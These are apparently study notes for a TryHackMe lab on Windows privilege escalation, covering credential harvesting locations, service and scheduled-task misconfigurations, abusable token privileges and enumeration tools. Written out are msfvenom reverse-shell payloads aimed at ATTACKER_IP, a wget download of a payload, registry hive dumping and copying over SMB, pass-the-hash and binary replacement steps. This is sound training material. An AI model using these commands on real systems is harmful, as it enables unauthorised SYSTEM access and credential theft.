# Windows Privilege Escalation
> [TryHackMe Link](https://tryhackme.com/room/windowsprivesc20)

Privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system:
- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

## Windows Users
Windows systems mainly have two kinds of users:
- **Administrators**: Users with the most privileges; can change any system configuration parameter and access any file in the system.
- **Standard**: Users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files

There also exist special built-in accounts used by the operating system in the context of privilege escalation, these accounts are created and managed by Windows, and can't be used as other regular accounts:
- **SYSTEM / LocalSystem**: Account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
- **Local Service**: Default account used to run Windows services with minimum privileges. It will use anonymous connections over the network.
- **Network Service**: Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

> **Note:** Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.

## Harvesting Passwords
Some usual locations to find passwords within systems for compromise

### Unattended Windows Installations
An unattended installation refers to installing Windows on a large number of hosts without interaction, possibly using Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network.

These installations require the use of an administrator account to perform the initial setup, where credentials to these could end up being stored in the machine in the following locations:
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

### Powershell History
Powershell commands get stored into a file that keeps a memory of past commands. Retrieve from CMD ($Env:userprofile needed for Powershell) using:
- `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
  
### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. 
- `cmdkey /list` - lists saved credentials
- `runas /savecred /user:admin cmd.exe` - Run commands as a specific user

### IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. 
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

> `type PATH | findstr connectionString` can be used to find database connection strings

### Retrieve Credentials from Software (PUTTY)
Users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
- `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
  - Simon Tatham is the creator of PuTTY (and his name is part of the path)

> Note: Any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

## Route of Escalation

### Scheduled Tasks
Scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
- `schtasks /query /tn vulntask /fo list /v`
  - **Task to Run** parameter which indicates what gets executed by the scheduled task
  - **Run As User** parameter, which shows the user that will be used to execute the task.

If the current user can modify or overwrite the "Task to Run" executable, you can control what gets executed by the user, resulting in a simple privilege escalation. 
- `icacls PATH FROM TASK TO RUN` - check the file permissions on the executable,
  - BUILTIN\Users:(I)(F) - Has full access (F) over the task's binary.

### AlwaysInstallElevated
Windows installer files (.msi) are used to install applications on the system. They usually run with the privilege **level of the user that starts it**. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges. This method requires two registry values to be set
- `C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
- `C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
  
Once set you can generate a malicious reverse shell .msi file using msfvenom, as seen below:
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`
- `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` - Run the installer on the target 

## Windows Services 
Windows services are managed by the **Service Control Manager** (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services. Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. 
- `sc qc <SERVICE>` checks the service configuration
  - **SERVICE_START_NAME** account used to run the service
  - **BINARY_PATH_NAME** associated executable
- Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>`
  - **ImagePath**  subkey showing associated executable
  - **ObjectName** subkey showing account used to run the service
  - **Security** subkey showing any DACL configured

### Insecure Permissions on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account 

Analysis of a vulnerability found on Splinterware System Scheduler:
1. `sc qc WindowsSchdular`
2. `icacls C:\PROGRA~2\SYSTEM~1\WService.exe` (check the permissions on the executable)
   1. Everyone group has modify permissions (M) on the service's executable. Can overwrite it with any payload of our preference
3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
   1. Create a exe-service payload with a reverse shell 
4. `python3 -m http.server` (host if for download onto the target)
5. `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe` (pull down onto target)
6. Move the payload into `C:\PROGRA~2\SYSTEM~1\WService.exe` replacing WService.exe with the payload 
7. `icacls WService.exe /grant Everyone:F`
8. `nc -lvnp 4445` on the attacker machine 
9. `sc stop windowsscheduler` and then `sc start windowsschedular` to restart the service triggering the payload

### Unquoted Service Paths
Working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable which means that the path of the associated executable isn't properly quoted to account for spaces on the command 
- `BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` could be the output of `sc qc`
  - There are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous
  - SCM is unsure if you are attempting to run Disk.exe with arguments `Sorter` and `Enterprise\bin\disksrs.exe`
  - This chains continues to the next space so SCM checks if you mean `Disk Sorter.exe`
- SCM tries to help the user and starts searching for each of the binaries in the order shown above and it will run the first one it finds

> **Note:** most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users. If an installer changes the permissions on the installed folders, making the services vulnerable. An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

### Insecure Service Permissions
Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. Allo
wing you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) (opens in new tab) from the Sysinternals suite. 
- `accesschk64.exe -qlc thmservice`
- Example: **BUILTIN\\Users** group has the **SERVICE_ALL_ACCESS** permission, which means any user can reconfigure the service  

To change the service's associated executable and account: `sc config <SERVICE> binPath= "<PAYLOAD_PATH>" obj= LocalSystem`
- Can use any account to run the service. In this instance LocalSystem as it is the highest privileged account available.

## Windows Privleges
[Privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) are rights that an account has to perform specific system-related tasks. A list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
- `whoami /priv` -  view set of assigned privileges to current user

### SeBackup / SeRestore
Allow users to read and write to any file in the system, ignoring any DACL in place. (designed to allow users to perform backups from a system without needing high perms).

An attack method is copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash: 
1. Create files with the registry hives content
   1. `reg save hklm\system C:\Users\<USER>\system.hive` and `reg save hklm\sam C:\Users\<USER>\sam.hive`
2. Create a share named public pointing to the share directory, which requires the username and password of our current windows session
   1. `impacket-smbserver -smb2support -username USERNAME -password PASSWORD public ./share`
3. Copy these files to our attacker machine using SMB:
   1. `copy C:\Users\<USER>\sam.hive \\ATTACKER_IP\public\`
   2. `copy C:\Users\<USER>\system.hive \\ATTACKER_IP\public\`
4. Retrieve the users' password hashes:
   1. `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
5. Perform a Pass-the-Hash attack
   1. `impacket-psexec -hashes <USER-HASH> <USER>@<TARGET_IP>`

### SeTakeOwnership
Allows a user to take ownership of any object on the system, including files and registry keys. Can search for a service running as SYSTEM and take ownership of the service's executable. 

Can abuse utilman.exe (a built-in Windows application used to provide Ease of Access options during the lock screen) to escalate privileges:
1. Utilman is run with SYSTEM privileges, effectively gaining SYSTEM privileges if we replace the original binary for any payload. As we can take ownership of any file, replacing it is trivial
2. Take ownership of the utilman.exe
   1. `takeown /f C:\Windows\System32\Utilman.exe`
3. Provide full permissions over the binary
   1. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
4. Now if we lock the screen and click Ease of Access button then it will open cmd as SYSTEM

### SeImpersonate / SeAssignPrimaryToken
Allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
To elevate privileges a attackers needs:
1. Spawn a process so that users can connect and authenticate to it for impersonation to occur. 
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM) can be used to demonstrate this: 
> assuming we have already compromised a website running on IIS and that we have planted a web shell on a address and have uploaded the exploit to the target machine

RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network.  
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

### Unpatched Software
Software / drivers installed on the target system can present various privilege escalation opportunities. 
- Organisations and users may not update them as often as they update the operating system. 
- `wmic product get name,version,vendor` 
  - Depending on how some of the programs were installed, they might not get listed here
- Search for existing exploits on the installed software online on sites like exploit-db, packet storm or Google
  
## Tools

### [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
Script developed to enumerate the target system to uncover privilege escalation paths. 

### [PrivescCheck](https://github.com/itm4n/PrivescCheck)
A PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

You may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as:
1. `Set-ExecutionPolicy Bypass -Scope process -Force`
2. `. .\PrivescCheck.ps1`
3. `Invoke-PrivescCheck`
   
### [WES-NG](https://github.com/bitsadmin/wesng): Windows Exploit Suggester - Next Generation
A script which does not run on the target machine all together.
1. Run `wes.py --update` command to update the database.
2. To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
3. `wes.py systeminfo.txt`

### Metasploit 
If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system. 

### Useful Links
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) 
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html) 
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)